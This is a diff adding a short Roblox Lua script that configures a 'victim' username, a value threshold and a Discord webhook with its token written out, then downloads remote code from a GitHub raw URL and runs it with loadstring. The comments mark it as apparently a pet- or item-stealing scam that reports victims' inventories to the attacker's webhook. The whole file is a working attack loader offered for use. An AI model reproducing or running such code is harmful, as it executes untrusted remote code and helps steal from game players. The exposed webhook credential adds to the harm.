@@ -1,0 +1,6 @@
+_G.Username = "brtoplegal" -- user you should join victim on
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1324851069796220999/SpRPiQqXgKj6mdN6cpuG63mTbSuH_zlBjBjpTiPo3u2LczBRJJsdBEyXLCPqn39ZnU05" -- change to your webhook 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/romanin1607/AdHub1/refs/heads/main/AdPets"))()
